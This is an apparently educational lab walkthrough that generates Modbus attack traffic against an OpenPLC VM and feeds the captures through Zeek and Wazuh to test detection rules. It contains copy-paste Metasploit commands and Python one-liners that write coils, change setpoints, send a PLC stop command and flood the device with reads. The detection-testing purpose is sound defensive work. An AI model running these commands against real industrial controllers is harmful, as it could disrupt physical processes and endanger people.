# Walkthrough Command Reference

All commands are copy-paste ready. Run the `tcpdump` line on the **slave/plc VM** before each attack, then run the attack from the indicated machine (Kali unless stated otherwise). Stop `tcpdump` with Ctrl+C when the attack finishes.

Between Attack 2, Attack 3, and the edge cases, reset the process on the plc's OpenPLC dashboard: **Stop PLC**, then **Start PLC**, to restore default values before the next demo.

---

## Attack 1 — Reconnaissance (Metasploit)

```bash
sudo tcpdump -i enp0s8 -n -w ~/attack_01_recon.pcap port 502
```

```
msfconsole

use auxiliary/scanner/scada/modbusdetect
set RHOSTS 192.168.56.4
run

use auxiliary/scanner/scada/modbus_findunitid
set RHOSTS 192.168.56.4
run

use auxiliary/scanner/scada/modbus_banner_grabbing
set RHOSTS 192.168.56.4
run
```

---

## Attack 2 — Coil write / close the valve

### Metasploit

```bash
sudo tcpdump -i enp0s8 -n -w ~/attack_02a_valve_write_metasploit.pcap port 502
```

```
use auxiliary/scanner/scada/modbusclient
set RHOSTS 192.168.56.4
set RPORT 502
set UNIT_NUMBER 1
set ACTION WRITE_COIL
set DATA_ADDRESS 1
set DATA 0
run
```

### Python

```bash
sudo tcpdump -i enp0s8 -n -w ~/attack_02b_valve_write_python.pcap port 502
```

```bash
python3 -c '
import socket, struct
s = socket.create_connection(("192.168.56.4", 502), timeout=3)
s.send(struct.pack(">HHHBBHH", 1, 0, 6, 1, 5, 1, 0x0000))
print(s.recv(256).hex())
s.close()
'
```

---

## Attack 3 — Register write / setpoint manipulation

### Metasploit

```bash
sudo tcpdump -i enp0s8 -n -w ~/attack_03a_setpoint_write_metasploit.pcap port 502
```

```
use auxiliary/scanner/scada/modbusclient
set RHOSTS 192.168.56.4
set RPORT 502
set UNIT_NUMBER 1
set ACTION WRITE_REGISTER
set DATA_ADDRESS 1
set DATA 100
run
```

### Python

```bash
sudo tcpdump -i enp0s8 -n -w ~/attack_03b_setpoint_write_python.pcap port 502
```

```bash
python3 -c '
import socket, struct
s = socket.create_connection(("192.168.56.4", 502), timeout=3)
s.send(struct.pack(">HHHBBHH", 1, 0, 6, 1, 6, 1, 100))
print(s.recv(256).hex())
s.close()
'
```

---

## Attack 4 — Reset / diagnostic attempt

### Metasploit (vendor UMAS stop)

```bash
sudo tcpdump -i enp0s8 -n -w ~/attack_04a_reset_metasploit.pcap port 502
```

```
use auxiliary/admin/scada/modicon_command
set RHOSTS 192.168.56.4
set RPORT 502
set MODE STOP
run
```

### Python (standard FC8 Diagnostics)

```bash
sudo tcpdump -i enp0s8 -n -w ~/attack_04b_reset_fc8_python.pcap port 502
```

```bash
python3 -c '
import socket, struct
s = socket.create_connection(("192.168.56.4", 502), timeout=3)
s.send(struct.pack(">HHHBBHH", 1, 0, 6, 1, 8, 1, 0x0000))
r = s.recv(256)
print("response:", r.hex())
s.close()
'
```

---

## Attack 5 — Read flood (Python only, two variants)

### Variant A — short-lived connections (one per request)

```bash
sudo tcpdump -i enp0s8 -n -w ~/attack_05a_read_flood_slow.pcap port 502
```

```bash
python3 -c '
import socket, struct, time
start = time.time()
count = 0
duration = 15
while time.time() - start < duration:
    try:
        s = socket.create_connection(("192.168.56.4", 502), timeout=2)
        s.send(struct.pack(">HHHBBHH", count % 65535, 0, 6, 1, 3, 0, 3))
        s.recv(256)
        s.close()
        count += 1
    except Exception as e:
        print("error:", e)
        break
elapsed = time.time() - start
print(f"Sent {count} requests in {elapsed:.1f}s ({count/elapsed:.1f} req/s)")
'
```

### Variant B — one persistent connection

```bash
sudo tcpdump -i enp0s8 -n -w ~/attack_05b_read_flood_fast.pcap port 502
```

```bash
python3 -c '
import socket, struct, time
s = socket.create_connection(("192.168.56.4", 502), timeout=5)
start = time.time()
count = 0
duration = 10
while time.time() - start < duration:
    s.send(struct.pack(">HHHBBHH", count % 65535, 0, 6, 1, 3, 0, 3))
    s.recv(256)
    count += 1
s.close()
elapsed = time.time() - start
print(f"Sent {count} requests in {elapsed:.1f}s ({count/elapsed:.1f} req/s)")
'
```

---

## Edge case — legitimate write from the master (false positive)

Run on the **master VM**, not Kali.

```bash
sudo tcpdump -i enp0s8 -n -w ~/false_positive_master_write.pcap port 502
```

```bash
python3 -c '
import socket, struct
s = socket.create_connection(("192.168.56.4", 502), timeout=3)
s.send(struct.pack(">HHHBBHH", 1, 0, 6, 1, 5, 1, 0x0000))
print(s.recv(256).hex())
s.close()
'
```

---

## Edge case — missed reconnaissance (FC3, same function the master uses)

Run on **Kali**.

```bash
sudo tcpdump -i enp0s8 -n -w ~/missed_recon_fc3.pcap port 502
```

```bash
python3 -c '
import socket, struct
s = socket.create_connection(("192.168.56.4", 502), timeout=3)
s.send(struct.pack(">HHHBBHH", 1, 0, 6, 1, 3, 0, 3))
print(s.recv(256).hex())
s.close()
'
```

---

## Feeding a capture through the Wazuh pipeline (on the wazuh VM)

```bash
# convert with Zeek, if not already converted
mkdir -p ~/modbus-assignment/zeek-output/<capture-name>
docker run --rm --user "$(id -u):$(id -g)" \
  -v ~/modbus-assignment/incoming:/pcaps:ro \
  -v ~/modbus-assignment/zeek-output/<capture-name>:/out \
  -w /out \
  zeek/zeek@sha256:70733f4e540ba1608e37e00c6a93d009f79734262c9ec2ba09d90aa9abc16de5 \
  zeek -C -r /pcaps/<capture-name>.pcap LogAscii::use_json=T

# feed it into the live pipeline
sudo truncate -s 0 /var/log/modbus/pipeline-modbus.log
sudo bash -c 'cat /home/vboxuser/modbus-assignment/zeek-output/<capture-name>/modbus.log >> /var/log/modbus/pipeline-modbus.log'
sleep 2
sudo tail -20 /var/ossec/logs/alerts/alerts.json | grep -E "100011|100012|100013|100014|100016|100017"
```
